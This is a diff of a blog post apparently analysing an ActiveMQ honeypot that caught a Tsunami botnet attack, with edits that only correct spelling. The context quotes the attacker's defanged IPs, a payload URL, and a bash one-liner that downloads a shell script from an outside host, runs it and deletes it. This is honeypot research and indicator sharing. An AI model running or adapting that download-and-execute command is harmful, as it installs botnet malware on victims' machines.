@@ -55,7 +55,7 @@ This is example of attack scenario in my local testing infrastructure. Let's loo
 Firstly I deployed [activemq-honeypot](https://github.com/infokek/activemq-honeypot) on my rented server and caught real attacker at 2023/12/19 19:21 UTC+3.
 ![Real Attack Logs](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_logs.png)
 _activemq-honeypot output logs_
-Secondly honeypot got attack from [103[.]228.162[.]76](https://www.virustotal.com/gui/ip-address/103.228.162.76/detection) which identified as malicius on VirusTotal.
+Secondly honeypot got attack from [103[.]228.162[.]76](https://www.virustotal.com/gui/ip-address/103.228.162.76/detection) which identified as malicious on VirusTotal.
 
 [activemq-honeypot](https://github.com/infokek/activemq-honeypot) also creates json output with IoCs after succesful exploitation.
 ![Real Attack Json](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_json.png)
@@ -64,7 +64,7 @@ _activemq-honeypot output json_
 Malicious XML payload was hosted on `hxxp://188[.]166.177[.]88/wp-content/themes/twentynineteen/poc2.xml`. 
 ![XML payload](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/xml_payload.png)
 _Malicious XML payload_
-This url also identified as malicius on VirusTotal service. Honeypot also automatically extracted RCE command from XML payload:
+This url also identified as malicious on VirusTotal service. Honeypot also automatically extracted RCE command from XML payload:
 
 ```bash -c (wget -O pk.sh  hxxp://161[.]35.219[.]184/.s/1sh || curl -o pk.sh hxxp://161[.]35.219[.]184/.s/3sh || fetch  -o pk.sh hxxp://161[.]35.219[.]184/.s/3sh); chmod +x pk.sh; ./pk.sh; rm -rf pk.sh```
 
